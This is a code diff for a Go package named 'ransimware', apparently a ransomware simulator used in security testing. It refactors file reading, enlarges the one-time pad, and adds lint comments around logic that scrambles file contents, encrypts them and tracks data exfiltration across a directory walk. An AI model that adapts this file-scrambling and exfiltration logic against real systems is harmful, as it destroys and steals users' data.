@@ -2,7 +2,6 @@ package ransimware
 
 import (
 	"crypto/rand"
-	"io"
 	"io/fs"
 	"os"
 	"path/filepath"
@@ -28,7 +27,7 @@ type Simulator struct {
 	last           []time.Time
 	MaxFileSize    int64
 	Notify         func() error
-	OTP            [32]byte
+	OTP            []byte
 	paths          []string
 	Threads        int
 	WaitEvery      time.Duration
@@ -42,12 +41,13 @@ func New(threads int) *Simulator {
 		count:       safety.NewUint64(),
 		Encrypt:     DefaultEncrypt,
 		Exfil:       DefaultExfil,
-		MaxFileSize: 128 * 1024 * 1024,
+		MaxFileSize: 128 * 1024 * 1024, //nolint:mnd // 128 MB
 		Notify:      DefaultNotify,
 		Threads:     threads,
 	}
 
-	if _, e = rand.Read(s.OTP[:]); e != nil {
+	s.OTP = make([]byte, 128) //nolint:mnd // 128 byte one-time-pad
+	if _, e = rand.Read(s.OTP); e != nil {
 		// Fallback to hard-coded incrementing bytes
 		s.OTP[0] = 0x41
 		for i := range len(s.OTP) - 1 {
@@ -69,6 +69,7 @@ func (s *Simulator) Exclude(pattern string) error {
 	}
 
 	s.excludes = append(s.excludes, r)
+
 	return nil
 }
 
@@ -83,14 +84,15 @@ func (s *Simulator) Include(pattern string) error {
 	}
 
 	s.includes = append(s.includes, r)
+
 	return nil
 }
 
 func (s *Simulator) processFile(tid int, data tp.ThreadData) {
-	var contents []byte
+	var b []byte
 	var e error
 	var exfil bool = true
-	var f *os.File
+	//nolint:errcheck,forcetypeassert // Was stored as string
 	var path string = data["path"].(string)
 	var size uint64
 	var tmp []byte
@@ -98,33 +100,26 @@ func (s *Simulator) processFile(tid int, data tp.ThreadData) {
 	// Check if delay is needed
 	s.last[tid] = wait(s.last[tid], s.WaitEvery, s.WaitFor)
 
-	if f, e = os.Open(path); e != nil {
-		e = errors.Newf("failed to open %s: %w", path, e)
-		log.Err(e.Error())
-		return
-	}
-	defer f.Close()
-
-	// Read file
-	if contents, e = io.ReadAll(f); e != nil {
+	if b, e = os.ReadFile(filepath.Clean(path)); e != nil {
 		e = errors.Newf("failed to read %s: %w", path, e)
 		log.Err(e.Error())
+
 		return
 	}
 
-	// Close file
-	f.Close()
-
 	// Turn file contents into garbage
-	for i := range contents {
-		contents[i] ^= s.OTP[i%32]
+	if len(s.OTP) > 0 {
+		for i := range b {
+			b[i] ^= s.OTP[i%len(s.OTP)]
+		}
 	}
 
 	// Encrypt contents
-	if tmp, e = s.Encrypt(path, contents); e != nil {
+	if tmp, e = s.Encrypt(path, b); e != nil {
 		e = errors.Newf("Encrypt returned error: %w", e)
 		log.Err(e.Error())
-		tmp = contents
+
+		tmp = b // Safe b/c we already xor'd with OTP
 	}
 
 	// If threshold is achieved, stop data exfil
@@ -171,6 +166,7 @@ func (s *Simulator) Target(path string) error {
 	}
 
 	s.paths = append(s.paths, path)
+
 	return nil
 }
 
@@ -206,6 +202,7 @@ func (s *Simulator) Run() error {
 				if e != nil {
 					// Ignore errors as we want to traverse everything
 					// we possibly can
+					//nolint:nilerr // Ignoring to continue
 					return nil
 				}
 
